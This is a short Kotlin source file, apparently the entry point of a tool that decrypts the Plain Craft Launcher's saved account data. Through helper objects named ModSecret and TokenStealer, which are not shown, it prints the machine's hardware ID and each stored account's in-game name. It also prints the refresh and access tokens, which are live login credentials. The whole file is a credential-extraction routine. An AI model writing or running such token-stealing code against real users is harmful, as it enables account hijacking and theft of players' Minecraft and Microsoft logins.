package rip.pclauncher.decryptor

fun main() {
    println("~Plain Craft Launcher Decryptor~")
    println("HWID: ${ModSecret.secretGetUniqueAddress()}")
    println("IGN: ${TokenStealer.getIGN()}")
    println("RefreshToken: ${TokenStealer.getRefreshToken()}")
    println("AccessToken: ${TokenStealer.getAccessToken()}")
    println("~All Accounts~")
    val accounts = TokenStealer.getAllAccounts()
    accounts.forEach {
        println("IGN: ${it.ign}")
        println("RefreshToken: ${it.refreshToken}")
        println("============================")
    }
}